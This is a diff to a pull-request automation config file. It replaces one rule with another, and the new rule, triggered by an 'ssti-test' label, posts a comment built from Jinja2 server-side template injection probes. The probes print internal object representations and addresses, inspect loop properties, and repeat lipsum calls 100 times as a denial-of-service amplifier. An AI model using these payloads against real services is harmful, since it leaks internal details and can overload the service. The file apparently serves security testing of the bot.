@@ -1,14 +1,20 @@
 pull_request_rules:
-  - name: chain-dos-amp
+  - name: chain-max
     conditions:
       - label=ssti-test
     actions:
       comment:
         message: |
-          ADDR_MAP:
-          {% for k,v in dict(lip=lipsum,cyc=cycler,joi=joiner,ns=namespace).items() %}{{k}}={{v|string|truncate(80)}}
-          {% endfor %}
-          LOOP_VAR={% for i in range(3) %}{{loop.index}}/{{loop.length}},{% endfor %}
-          LIPSUM_HEAVY={{lipsum(n=5,html=False)|truncate(500)}}
-          CYCLER_ITEMS={{cycler(1,2,3)|string}}
-          NS_WITH_DATA={{namespace(secret="leaked",addr=lipsum|string)|string}}
+          === OBJECT DISCLOSURE ===
+          LIPSUM_PPRINT={{lipsum|pprint}}
+          CYCLER_PPRINT={{cycler|pprint}}
+          NS_PPRINT={{namespace(secret=lipsum|string,items=dict(a=1).items()|list)|pprint}}
+          === STABLE ADDR CHECK ===
+          ADDR={{lipsum|string}}
+          === LOOP PROPS ===
+          {% for i in range(3) %}IDX={{loop.index0}} REV={{loop.revindex}} DEPTH={{loop.depth}} FIRST={{loop.first}} LAST={{loop.last}},{% endfor %}
+          === DOS AMP (100 lipsum calls) ===
+          {% for i in range(100) %}{{lipsum(n=1,html=False)|truncate(10)}}{% endfor %}
+          === STRING OPS ===
+          UPPER={{(lipsum|string)|upper}}
+          REVERSE={{(lipsum|string)|reverse}}
